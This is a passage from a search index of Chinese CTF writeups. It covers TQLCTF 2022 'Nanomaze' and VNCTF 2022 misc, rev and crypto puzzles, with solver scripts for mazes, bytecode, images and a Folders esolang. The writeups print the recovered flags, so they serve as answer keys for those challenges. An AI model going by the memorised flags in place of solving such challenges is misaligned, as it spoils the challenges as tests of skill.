\u7684\u7ed3\u5c3e\uff0c\u6240\u4ee5\u7ed3\u5c3e\u5e94\u8be5\u662f }\uff0c\u5176\u5bf9\u5e9416\u8fdb\u5236\u503c\u4e3a 7D\uff0c\u4e8c\u8fdb\u5236 0111 1101\uff0c\u53d1\u73b0\u7ed3\u5c3e\u786e\u5b9e\u6709\u7c7b\u4f3c 0111 1101 \u7684 note \u7136\u540e\u8bb0\u5f55\u6240\u6709 note\uff0c\u8f6c\u6362\u4e3a\u5b57\u7b26\u5c31\u53ef\u4ee5\u62ff\u5230\u6700\u540e\u4e00\u90e8\u5206flag\uff1a5HoWtIme}</p> <p>\u62fc\u63a5\u5f97\u5230\u5b8c\u6574flag\uff1aTQLCTF{VVElcOM3_TO_O$u_i7s_5HoWtIme}</p>"},{"location":"writeups/tqlctf2022/#nanomaze","title":"Nanomaze","text":"<p>\u662f nano \u590d\u523b\u7684 revomaze green \u8ff7\u5bab</p> <p>\u4e3b\u8981\u73a9\u6cd5\u5c31\u662f\u6574\u4e2a\u5730\u56fe\u5728\u5de6\u53f3\u65b9\u5411\u4e0a\u662f\u5faa\u73af\u7684\uff08\u5730\u56fe\u5377\u6210\u4e00\u4e2a\u5706\u7b52\uff09 \u6574\u4e2a\u8ff7\u5bab\u5730\u56fe\u5305\u542b\u9ad8\u5ea6\uff0c\u6bcf\u6b21\u53ea\u80fd\u5411\u540c\u9ad8\u5ea6\u8d70\uff0c\u9ad8\u5ea6\u4e0b\u964d\u4e86\u5c31\u4f1a\u6536\u5230 [click] \u63d0\u793a\uff0c\u8fd9\u4e4b\u540e\u4e5f\u5c31\u4e0d\u80fd\u518d\u539f\u8def\u8fd4\u56de\u4e86 \u5e76\u4e14\u6709\u7279\u6b8a\u4f4d\u7f6e\u53ef\u4ee5\u4f7f\u9ad8\u5ea6\u4e0a\u5347\uff08\u7b2c\u4e00\u884c\u67d0\u5904\uff09 \u76ee\u6807\u662f\u5230\u8fbe\u5730\u56fe\u7684\u6700\u4e0b\u9762\u4e00\u5c42\u7684\u67d0\u4e2a\u4f4d\u7f6e</p> <p>\u7531\u4e8e\u5de6\u53f3\u5faa\u73af\uff0c\u6240\u4ee5\u5148\u627e\u5230\u5730\u56fe\u7684\u6a2a\u5411\u5927\u5c0f \u53ef\u4ee5\u53d1\u73b0\u5411\u53f3\u8d70\u4e00\u6bb5\u540e\u4f1a\u8d70\u4e0d\u52a8\uff0c\u800c\u5411\u5de6\u8d70\u53ef\u4ee5\u4e0d\u65ad\u5f97\u5230 click\uff0c\u901a\u8fc7\u4e24\u4e2a click \u4e4b\u95f4\u7684\u5750\u6807\u5dee\u53ef\u4ee5\u5f97\u5230\u5730\u56fe\u7684\u6a2a\u5411\u5927\u5c0f\u7ea6 75 \u6240\u4ee5\u4e4b\u540e\u7684\u6a2a\u5411\u5750\u6807\u5c31\u53ef\u4ee5\u5bf9 75 \u53d6\u6a21</p> <p>\u540c\u65f6\u4e5f\u53ef\u4ee5\u53d1\u73b0\u6bcf\u6b21\u5411\u53f3\u8d70\u5230\u8d70\u4e0d\u52a8\u7684\u8ddd\u79bb\u4e0d\u4e00\u5b9a \u8fd9\u8bf4\u660e\u8d77\u59cb\u4f4d\u7f6e\u5e76\u4e0d\u56fa\u5b9a\uff0c\u6240\u4ee5\u9700\u8981\u5148\u79fb\u52a8\u5230\u4e0d\u80fd\u52a8\uff0c\u518d\u91cd\u7f6e\u5750\u6807\uff0c\u8fd9\u6837\u4f1a\u6e05\u695a\u5f88\u591a</p> <p>\u7136\u540e\u5c31\u662f\u76f2\u7740\u8d70\u8ff7\u5bab\uff0c\u7528\u4e86 pygame \u6765\u7ed8\u5236\u5230\u8fbe\u7684\u70b9\uff0c\u4ee5\u53ca\u53d1\u751f click \u7684\u4f4d\u7f6e</p> \u4ee3\u7801 <pre><code>from pwn import *\n\nimport pygame\nfrom pygame.locals import *\n\np = process([\"python\", \"main.py\"]) # \u672c\u5730\u590d\u73b0\nX, Y = 0, 0\nwidth = 75\n\npygame.init()\nWHITE = (255, 255, 255)\nGREEN = (0, 255, 0)\nRED = (255, 0, 0)\nBLUE = (0, 0, 255)\n\nsize = width, height = 800, 1000\nclock = pygame.time.Clock()\nscreen = pygame.display.set_mode(size)\npygame.display.set_caption(\"nanomaze\")\nscreen.fill(WHITE)\npygame.display.flip()\n\ndef send(direction):\n    res = p.recvuntil(b\"&gt; \")\n    click = False\n    if \"[click]\" in res.decode(\"utf-8\"):\n        click = True\n    p.sendline(direction.encode(\"utf-8\"))\n    return click, p.recvline().decode(\"utf-8\").strip()\n\ndef update_value(direction, value):\n    global X, Y\n    if direction == \"w\":\n        X -= value\n    elif direction == \"a\":\n        Y -= value\n    elif direction == \"s\":\n        X += value\n    else:\n        Y += value\n    if Y &lt; 0:\n        Y += 75\n\ndef move(direction, aim=None):\n    if aim is None:\n        times = 0\n        while times &lt; 20:\n            click, res = send(direction)\n            if click:\n                log.info(f\"click at    ({X}, {Y})\")\n                return\n            if \"Cannot be moved\" in res:\n                times += 1\n            else:\n                update_value(direction, float(res.split()[2]))\n                times = 0\n                # log.info(f\"  {direction} move to: ({X}, {Y})\")\n        log.info(f\"{direction} to bound: ({X}, {Y})\")\n    else:\n        now = int(X) if direction in \"ws\" else int(Y)\n        while abs((int(X) if direction in \"ws\" else int(Y)) - now) != aim:\n            click, res = send(direction)\n            if click:\n                log.info(f\"click at    ({X}, {Y})\")\n                pygame.display.update()\n                pygame.draw.circle(screen, RED, [20 + Y*10, 20 + X*10], 10, 2)\n                pygame.display.update()\n            if \"Cannot be moved\" not in res:\n                update_value(direction, float(res.split()[2]))\n            else:\n                log.info(f\"Can't move to {aim} in {direction}\")\n                break\n        log.info(f\"{direction} move to:  ({X}, {Y})\")\n        return True\n\nmove(\"w\")\nmove(\"d\")\nX, Y = 0, 75 # \u56fa\u5b9a\u8d77\u59cb\u4f4d\u7f6e\n\ndef w(cnt=1): # \u4fbf\u4e8e\u4ea4\u4e92\n    for _ in range(cnt):\n        move(\"w\", 1)\n        pygame.draw.circle(screen, BLUE, [20 + Y*10, 20 + X*10], 5, 5)\n        pygame.display.update()\ndef a(cnt=1):\n    for _ in range(cnt):\n        move(\"a\", 1)\n        pygame.draw.circle(screen, BLUE, [20 + Y*10, 20 + X*10], 5, 5)\n        pygame.display.update()\ndef s(cnt=1):\n    for _ in range(cnt):\n        move(\"s\", 1)\n        pygame.draw.circle(screen, BLUE, [20 + Y*10, 20 + X*10], 5, 5)\n        pygame.display.update()\ndef d(cnt=1):\n    for _ in range(cnt):\n        move(\"d\", 1)\n        pygame.draw.circle(screen, BLUE, [20 + Y*10, 20 + X*10], 5, 5)\n        pygame.display.update()\n\nwhile True:\n    pygame.display.update()\n    pygame.draw.circle(screen, BLUE, [20 + Y*10, 20 + X*10], 5, 5)\n    pygame.display.update()\n    op = input(\"&gt; \")\n    exec(op)\n</code></pre> <p>\u7ed3\u679c\uff1a </p> <p>nano \u7ed9\u7684\u6807\u51c6\u5730\u56fe\uff1a  \u5c31\u662f revomaze \u7684\u5730\u56fe\uff0c\u8fd9\u4e2a\u89c6\u9891\u7684\u6700\u540e\u6709\u5efa\u6a21\u6f14\u793a</p>"},{"location":"writeups/vnctf2022/","title":"VNCTF 2022 Writeup","text":"<p> \u7ea6 1218 \u4e2a\u5b57  230 \u884c\u4ee3\u7801  13 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u5bd2\u5047\u91cc\u7684\u4e00\u573a\u4e2a\u4eba\u8d5b\uff0c\u968f\u4fbf\u6253\u7740\u73a9\u4e86\u73a9\uff0c\u505a\u4e86\u51e0\u4e2a misc\uff0c\u548c\u50cf misc \u7684 web/rev/crypto\uff0c\u6392\u4e86 35</p> <p>\u6709\u51e0\u9053\u9898\u5dee\u70b9\u5c31\u80fd\u505a\u51fa\u6765\uff0c\u8fd9\u91cc\u4e5f\u90fd\u5199\u4e0b\u6765\u4e86</p> <p>VNCTF 2022 Official WriteUp</p>"},{"location":"writeups/vnctf2022/#gamev40","title":"GameV4.0","text":"<p>web \u7c7b\u578b\u7684\u7b7e\u5230\u9898</p> <p>\u5f00\u59cb\u8fd8\u53bb\u8ba4\u771f\u5730\u73a9\u4e86\u8fd9\u4e2a\u6e38\u620f\uff0c\u7136\u540e\u6253\u5b8c flag \u5173\u4e5f\u6ca1\u6709\u770b\u5230 flag\uff0c\u5c31\u53bb\u7ffb\u4e86\u6e90\u7801 \u53d1\u73b0\u4e86 data.js \u8fd9\u4e2a\u6587\u4ef6\u4fdd\u5b58\u4e86\u6240\u6709\u5173\u5361\u7684\u6570\u636e\uff0c\u7136\u540e\u5728\u6587\u4ef6\u7684\u6700\u672b\u5c3e\u6709\u4e00\u884c <pre><code>\"ZmxhZw==\": \"Vk5DVEYlN0JXZWxjb21lX3RvX1ZOQ1RGMjAyMiU3RA==\"\n</code></pre> base64 \u89e3\u7801\uff0c\u7136\u540e URL \u89e3\u7801\uff0c\u5f97\u5230\uff1aflag: <code>VNCTF{Welcome_to_VNCTF2022}</code></p>"},{"location":"writeups/vnctf2022/#gocalc0","title":"gocalc0","text":"<p>\u770b\u6837\u5b50\u662f\u975e\u9884\u671f\u4e86</p> <p>\u70b9\u8fdb flag \u5728\u8fd9\u91cc\uff0c\u91cc\u9762\u8bf4 flag is in your session\uff0c\u6253\u5f00 cookies \u53d1\u73b0\uff1a <pre><code>session: MTY0NDk4ODEyMnxEdi1CQkFFQ180SUFBUkFCRUFBQVNQLUNBQUVHYzNSeWFXNW5EQVlBQkVaTVFVY0djM1J5YVc1bkRDd0FLbVpzWVdkN01EWXlZamcyWlRNdE1tSTFNaTAwTURFMUxUZzJNall0TjJFNVkyVTVORFV4TldZMGZRPT18sud3sUmK5woUfaXQnzZ_R_eu8wGDMVPjfgXvyKo99os=\n</code></pre> base64 \u89e3\u7801\u540e\u53d1\u73b0\u91cc\u9762\u8fd8\u6709\u4e00\u6bb5 base64\uff0c\u7ee7\u7eed\u89e3\u7801\uff0c\u5c31\u6709 flag \u4e86\uff1a<code>flag{062b86e3-2b52-4015-8626-7a9ce94515f4}</code></p>"},{"location":"writeups/vnctf2022/#ezmath","title":"ezmath","text":"<p>\u4e00\u9053\u6ca1\u4ec0\u4e48\u542b\u91d1\u91cf\u7684 crypto</p> <p>\u9898\u76ee\u95ee\u7b2c x \u4e2a\u6ee1\u8db3 \\((2^n-1)\\equiv 0\\pmod{15}\\) \u7684 n\uff0c\u5e76\u4e14\u5728\u4e00\u5206\u949f\u4e4b\u5185\u56de\u7b54 777 \u6b21 \u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u7684 n \u4e00\u5b9a\u662f 4 \u7684\u500d\u6570\uff0c\u800c\u4e14\u662f\u5145\u8981\u7684\uff0c\u6240\u4ee5\u76f4\u63a5\u8bfb\u5165\u7136\u540e\u4e58 4 \u518d\u56de\u7b54\u5c31\u597d\u4e86</p>"},{"location":"writeups/vnctf2022/#babymaze","title":"BabyMaze","text":"<p>\u4e00\u9053 python \u7684 rev</p> <p>\u76f4\u63a5 uncompyle6 \u53d1\u73b0\u5361\u6b7b\uff0c\u7136\u540e marshal+dis \u8bfb\u53d6\u5b57\u8282\u7801\u53cd\u7f16\u8bd1 <pre><code>import dis\nimport marshal\n\nwith open(\"BabyMaze.pyc\", \"rb\") as f:\n    code = marshal.loads(f.read()[16:])\n\ndis.dis(code)\n</code></pre> \u5f97\u5230\u5f00\u5934\uff1a <pre><code>  1           0 JUMP_ABSOLUTE            4\n        &gt;&gt;    2 JUMP_ABSOLUTE            6\n        &gt;&gt;    4 JUMP_ABSOLUTE            2\n        &gt;&gt;    6 LOAD_CONST               0 (1)\n...\n             66 LOAD_CONST               0 (1)\n             68 BUILD_LIST              31\n             70 LOAD_CONST               0 (1)\n             72 LOAD_CONST               1 (5)\n             74 LOAD_CONST               0 (1)\n...\n            130 LOAD_CONST               0 (1)\n            132 BUILD_LIST              31\n...\n...\n           1862 LOAD_CONST               0 (1)\n           1864 LOAD_CONST               2 (0)\n...\n           1920 LOAD_CONST               3 (7)\n           1922 LOAD_CONST               0 (1)\n           1924 BUILD_LIST              31\n           1926 LOAD_CONST               0 (1)\n...\n           1986 LOAD_CONST               0 (1)\n\n  3        1988 BUILD_LIST              31\n           1990 BUILD_LIST              31\n           1992 STORE_NAME               0 (_map)\n</code></pre> \u7ed3\u5c3e\uff1a <pre><code>Disassembly of &lt;code object main at 0x00000222A2AC4660, file \".\\BabyMaze.py\", line 23&gt;:\n0 LOAD_GLOBAL        0 (print)\n2 LOAD_CONST         1 ('Welcome To VNCTF2022!!!')\n4 CALL_FUNCTION      1\n6 POP_TOP\n\n8 LOAD_GLOBAL        0 (print)\n0 LOAD_CONST         2 ('Hello Mr. X, this time your mission is to get out of this maze this time.(FIND THAT 7!)')\n2 CALL_FUNCTION      1\n4 POP_TOP\n\n6 LOAD_GLOBAL        0 (print)\n8 LOAD_CONST         3 ('you are still doing the mission alone, this tape will self-destruct in five seconds.')\n0 CALL_FUNCTION      1\n2 POP_TOP\n\n4 LOAD_GLOBAL        1 (maze)\n6 CALL_FUNCTION      0\n8 POP_JUMP_IF_FALSE 40\n\n0 LOAD_GLOBAL        0 (print)\n2 LOAD_CONST         4 ('Congratulation! flag: VNCTF{md5(your input)}')\n4 CALL_FUNCTION      1\n6 POP_TOP\n8 JUMP_FORWARD       8 (to 48)\n</code></pre> \u6240\u4ee5\u5927\u6982\u610f\u601d\u5c31\u662f\u6709\u4e00\u4e2a 31*31 \u5217\u8868\u6784\u6210\u7684 _map \u5730\u56fe\uff0c1 \u662f\u5899\uff0c0 \u53ef\u4ee5\u8d70\uff0c5 \u662f\u81ea\u5df1\uff0c\u8981\u5230\u8fbe 7 \u5e76\u4e14\u901a\u8fc7 wasd \u64cd\u7eb5\u65b9\u5411\uff0c\u5230\u8fbe 7 \u7684\u6240\u6709\u8f93\u5165\u518d md5 \u5c31\u662f flag</p> <p>\u6240\u4ee5\u76f4\u63a5\u6b63\u5219\u63d0\u53d6\u5217\u8868\uff0c\u7136\u540e\u6253\u5370\u51fa\u6765\u624b\u52a8\u505a\u4e00\u4e0b\u5c31\u597d <pre><code>import re\n\nwith open(\"maze.pyc\", \"r\") as f:\n    content = f.read()\n\nres = re.findall(\"(?:LOAD_CONST.*?\\((\\d)\\))\", content, re.S)\nprint(res)\nptr = 0\nfor i in range(31):\n    for j in range(31):\n        if res[ptr] == \"1\":\n            print(\"\u2588\", end=\"\")\n        else:\n            print(\" \", end=\"\")\n        ptr += 1\n    print()\n</code></pre></p> \u7ed3\u679c <pre><code>\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588 \u2588                 \u2588         \u2588\n\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\n\u2588 \u2588   \u2588       \u2588   \u2588   \u2588 \u2588   \u2588 \u2588\n\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\n\u2588   \u2588   \u2588             \u2588   \u2588   \u2588\n\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588   \u2588 \u2588   \u2588         \u2588   \u2588   \u2588 \u2588\n\u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588\n\u2588     \u2588 \u2588   \u2588   \u2588 \u2588 \u2588   \u2588 \u2588   \u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\n\u2588       \u2588     \u2588   \u2588 \u2588   \u2588 \u2588   \u2588\n\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\n\u2588       \u2588       \u2588 \u2588   \u2588   \u2588   \u2588\n\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588 \u2588   \u2588 \u2588 \u2588 \u2588 \u2588   \u2588           \u2588\n\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\n\u2588 \u2588 \u2588 \u2588 \u2588 \u2588   \u2588   \u2588 \u2588   \u2588 \u2588   \u2588\n\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\n\u2588   \u2588   \u2588 \u2588     \u2588 \u2588 \u2588 \u2588   \u2588   \u2588\n\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588\n\u2588 \u2588   \u2588 \u2588 \u2588       \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\n\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588\n\u2588 \u2588   \u2588 \u2588 \u2588         \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\n\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\n\u2588   \u2588 \u2588 \u2588     \u2588 \u2588 \u2588   \u2588   \u2588 \u2588 \u2588\n\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\n\u2588     \u2588     \u2588   \u2588       \u2588     \u2588\n\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\n\u2588         \u2588             \u2588     \u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nssssddssaassddddwwwwddwwddddddwwddddddssddwwddddddddssssaawwaassaassaassddssaassaawwwwwwaaaaaaaassaassddddwwddssddssssaassddssssaaaaaawwddwwaawwwwaassssssssssssddddssddssddddddddwwaaaaaawwwwddssddwwwwwwwwddssddssssssssddddss\nVNCTF{801f190737434100e7d2790bd5b0732e}\n</code></pre>"},{"location":"writeups/vnctf2022/#_1","title":"\u4ed4\u7ec6\u627e\u627e","text":"\u9898\u76ee <p>\u5f88\u660e\u663e\u80fd\u53d1\u73b0\u6709\u50cf\u7d20\u683c\u70b9\uff0c\u5e76\u4e14\u6709\u4e00\u4e9b\u989c\u8272\u4e0d\u4e00\u6837\uff0c\u53ef\u80fd\u662f flag \u4e8e\u662f\u6253\u7b97\u63d0\u53d6\u51fa\u6240\u6709\u683c\u70b9\uff0c\u4f46\u662f\u597d\u50cf\u662f\u5206\u5757\u7684\uff0c\u4e0d\u80fd\u4e00\u6b21\u6027\u5b8c\u6574\u63d0\u53d6</p> <p>\u4e8e\u662f\u5c31\u8089\u773c\u786c\u770b\uff0c\u5f97\u5230 flag\uff1a<code>vnctf{34aE@w}</code></p> <p>\u770b\u4e86 wp\uff0c\u662f\u7f29\u653e\u5927\u5c0f\u91cd\u65b0\u91c7\u6837\uff1a <pre><code>from PIL import Image\nimg = Image.open(\"flag.png\")\nimg = img.resize((79, 71), Image.NEAREST)\nimg.show()\n</code></pre> \u5c31\u80fd\u6e05\u6670\u770b\u5230 flag \u4e86</p>"},{"location":"writeups/vnctf2022/#strange-flag","title":"Strange flag","text":"<p>\u4e00\u4e2a\u6d41\u91cf\u5305\uff0cwireshark \u6253\u5f00\uff0c\u8ffd\u8e2a\u6700\u540e\u4e00\u4e2a TCP \u6d41 \u8bfb\u4e00\u4e0b\u8bf7\u6c42\uff0c\u53d1\u73b0\u662f\u8fdb\u5165\u5230\u4e86 flag \u76ee\u5f55\u4e0b\u6267\u884c\u4e86 tree \u547d\u4ee4</p> <p>\u5f97\u5230\u7684 response \u662f gzip \u538b\u7f29\u540e\u7684\uff0c\u53d6\u51fa\u5185\u5bb9\uff0c\u7136\u540e\u89e3\u538b\u5f97\u5230 tree \u7684\u7ed3\u679c\uff1a <pre><code>flag\n`-- New\\ folder\n    |-- New\\ folder\n    |   |-- New\\ folder\n    |   |-- New\\ folder\\ (2)\n    |   |-- New\\ folder\\ (3)\n    |   `-- New\\ folder\\ (4)\n    `-- New\\ folder\\ (2)\n        |-- New\\ Folder\\ (3)\n        |   |-- New\\ folder\n        |   |   |-- New\\ folder\n        |   |   |   |-- New\\ folder\n        |   |   |   |-- New\\ folder(2)\n        |   |   |   |   `-- New\\ folder\n        |   |   |   |-- New\\ folder(3)\n        |   |   |   |   `-- New\\ folder\n        |   |   |   `-- New\\ folder(4)\n        |   |   |       `-- New\\ folder\n        |   |   `-- New\\ folder(2)\n        |   |       |-- New\\ folder\n        |   |       |-- New\\ folder(2)\n        |   |       |   `-- New\\ folder\n        |   |       |-- New\\ folder(3)\n        |   |       |   `-- New\\ folder\n        |   |       `-- New\\ folder(4)\n        |   |-- New\\ folder(10)\n...\n</code></pre> \u4e0d\u96be\u53d1\u73b0\uff0c\u662f\u4e00\u5806\u7a7a\u6587\u4ef6\u5939\u5f62\u6210\u7684\u7ed3\u6784 \u7136\u540e\u5c31\u56de\u60f3\u8d77\u4e86\u4e4b\u524d\u770b\u5230\u7684\u4e00\u79cd esolang \u53eb Folders\uff0c\u662f\u901a\u8fc7\u4e00\u5806\u5d4c\u5957\u7684\u7a7a\u6587\u4ef6\u5939\u7f16\u5199\u7684\uff0c\u8fd9\u4e2a\u53ef\u80fd\u5c31\u662f</p> <p>\u5148\u91cd\u5efa\u8d77\u8fd9\u4e2a\u76ee\u5f55\u7ed3\u6784\uff0c\u6ca1\u627e\u5230\u9006 tree \u7684\u73b0\u6210\u5de5\u5177\uff0c\u53ea\u597d\u624b\u5199\u4e00\u4e2a\u4e86\uff1a <pre><code>import os\nfrom pathlib import Path\n\nwith open(\"test\", \"r\") as f:\n    tree = f.readlines()\n\npath = Path(\"flag\")\nlast_level = -1\n\nfor each in tree:\n    level = each.find(\"N\")//4\n    if level &lt; last_level:\n        path = path.parent\n    if level == last_level:\n        path = path.parent\n    diff = last_level - level\n    for _ in range(diff):\n        path = path.parent\n    path = path / each.strip().replace(\"\\\\\", \"\")\n    last_level = level\n    os.makedirs(path)\n</code></pre> \u67e5\u4e86\u4e0b\uff0cFolders \u6709\u5de5\u5177\uff0cpip install Folders\uff0c\u7136\u540e Folders flag/\uff0c\u5f97\u5230 flag\uff1a<code>vnctf{d23903879df57503879bcdf1efc141fe}</code></p>"},{"location":"writeups/vnctf2022/#prize-wheel","title":"prize wheel","text":"<p>\u5dee\u4e00\u70b9\uff0c\u6700\u540e\u7684\u56fe\u7247\u9006\u8fc7\u53bb\u7684\u601d\u8def\u5b8c\u5168\u9519\u4e86</p> <p>\u9996\u5148\u7ed9\u4e86\u4e00\u4e2a exe\uff0c\u5f00\u59cb\u4e5f\u6ca1\u610f\u8bc6\u5230\u8fd9\u4e2a\u662f\u62bd\u5956\uff0c\u89c4\u5219\u4e5f\u6ca1\u770b\uff0c\u968f\u4fbf\u8dd1\u4e86\u8dd1\u5c31\u62ff\u5230\u4e86\u538b\u7f29\u5305\u5bc6\u7801 <code>f6a623a2c577de3b46c079267d4bdd6e</code> \u518d\u7ec6\u770b\u53d1\u73b0\u662f 0.5% \u7684\u6982\u7387\u80fd\u62bd\u5230\u5bc6\u7801\uff0c\u9884\u671f\u662f\u81ea\u52a8\u5316\u62bd\u5956\u6216\u8005\u9006\u5411\uff0c\u7ed3\u679c\u6211\u4e09\u6b21\u5c31\u62bd\u51fa\u6765\u4e86\uff1f\uff1f\uff08\u6b27\u5728\u4e86\u4e0d\u9700\u8981\u7684\u5730\u65b9.jpg\uff09</p> \u5145\u6ee1\u5e0c\u671b\u7684\u5f71\u50cf\uff08 <p></p> <p>\u538b\u7f29\u5305\u89e3\u5f00\u4e4b\u540e\u5f97\u5230\u53e6\u4e00\u4e2a\u56fe\u7247</p> \u9898\u76ee <p></p> <p>\u5f88\u660e\u663e\u5e94\u8be5\u662f\u4e00\u5f20\u56fe\u7247\u63d0\u53d6\u51fa\u4e86\u6240\u6709\u50cf\u7d20\u70b9\uff0c\u7136\u540e\u86c7\u5f62\u91cd\u65b0\u6392\u5217\u5f62\u6210\u8fd9\u5f20\u56fe\u7247</p> <p>\u9898\u76ee hint \u4e5f\u8bf4\u4e86\u5b58\u5728\u53ef\u4ee5\u5b9a\u4f4d\u7684\u4e1c\u897f\uff0c\u80af\u5b9a\u662f\u90a3\u4e9b\u767d\u70b9 \u4f46\u662f\u6211\u7684\u5199\u6cd5\u600e\u4e48\u6837\u90fd\u4e0d\u4f1a\u8ba9\u8fd9\u4e9b\u5bf9\u5728\u4e00\u8d77 \u6211\u7684\u60f3\u6cd5\u662f\u86c7\u5f62\u63d0\u53d6\u51fa\u6240\u6709\u50cf\u7d20\u70b9\uff0c\u7136\u540e\u6309\u7167\u987a\u5e8f\u4ece\u4e0a\u5230\u4e0b\u4ece\u5de6\u5230\u53f3\u586b\u5165</p> \u6211\u7684\u5199\u6cd5 <p><pre><code>from PIL import Image\nfrom tqdm import tqdm\nimport sys\n\nimg = Image.open(\"flag.png\")\nwidth, height = img.size\nres = Image.new(\"RGBA\", (1220, 1220))\n\nlst = []\n\nfor i in range(width // 2 + 1):\n    for j in range(i, width - i):\n        lst.append(img.getpixel((i, j)))\n    for j in range(i + 1, width - i):\n        lst.append(img.getpixel((j, width-i-1)))\n    for j in range(width - i - 2, i, -1):\n        lst.append(img.getpixel((width-i-1, j)))\n    for j in range(width - i - 1, i, -1):\n        lst.append(img.getpixel((j, i)))\n\nlst = lst[::-1]\n\nwith tqdm(total=600) as pbar:\n    for times in range(600):\n        ptr = 0\n        res = Image.new(\"RGBA\", (610, 1221))\n        for j in range(1220):\n            for i in range(width-times):\n                try:\n                    res.putpixel((i, j), lst[ptr])\n                    ptr += 1\n                except:\n                    pass\n        pbar.update(1)\n        res.save(f\"res/-{times}.png\")\n</code></pre> \u6362\u4e86\u597d\u591a\u79cd\u987a\u5e8f\uff0c\u5bfc\u51fa\u4e86\u4e00\u5343\u591a\u5f20\u56fe\u7247\u4e5f\u6ca1\u6709\u957f\u5f97\u597d\u770b\u7684</p> <p>\u770b\u4e86 wp\uff0c\u77e5\u9053\u4e86\u6bcf\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u5708\u4e0a\u90fd\u6709\u4e00\u4e2a\u767d\u8272\u7684\u70b9\uff0c\u8981\u65cb\u8f6c\u6bcf\u4e00\u5708\uff0c\u8ba9\u767d\u8272\u7684\u70b9\u5bf9\u6210\u4e00\u6761\u7ebf</p> <p>\u6240\u4ee5\u9700\u8981\u5199\u811a\u672c\u6765\u65cb\u8f6c\u6bcf\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u5708\u76f4\u5230\u5bf9\u9f50\uff1a</p> \u6b63\u89e3 <p><pre><code>from PIL import Image\nimg = Image.open('flag.png')\nwidth, height = img.size\nc_x = width // 2\nc_y = height // 2\nfor count in range(3, width+1, 2):\n    print(count)\n    d = count // 2\n    for i in range((count-1)*4):\n        p_x = c_x - d\n        p_y = c_y - d\n        tmp0 = img.getpixel((width//2, c_y-count//2))\n        if tmp0[0] == 255 and tmp0[1] == 255 and tmp0[2] == 255:\n            break\n        tmp = img.getpixel((p_x, p_y))\n        for j in range(count-1):\n            img.putpixel((p_x, p_y), (img.getpixel((p_x+1, p_y))))\n            p_x += 1\n        for j in range(count-1):\n            img.putpixel((p_x, p_y), (img.getpixel((p_x, p_y+1))))\n            p_y += 1\n        for j in range(count-1):\n            img.putpixel((p_x, p_y), (img.getpixel((p_x-1, p_y))))\n            p_x -= 1\n        for j in range(count-2):\n            img.putpixel((p_x, p_y), (img.getpixel((p_x, p_y-1))))\n            p_y -= 1\n        img.putpixel((p_x, p_y), tmp)\nimg.save(\"trueflag.png\")\n</code></pre> </p>"},{"location":"writeups/vnctf2022/#simple-macos","title":"simple macos","text":"<p>\u4e5f\u662f\u5dee\u4e00\u70b9\uff0c\u770b\u9519\u9690\u5199\u7684\u56fe\u7247\u6587\u4ef6\u4e86\uff0c\u505a\u4e86\u534a\u5929\u505a\u4e0d\u51fa\u6765</p> <p>macOS 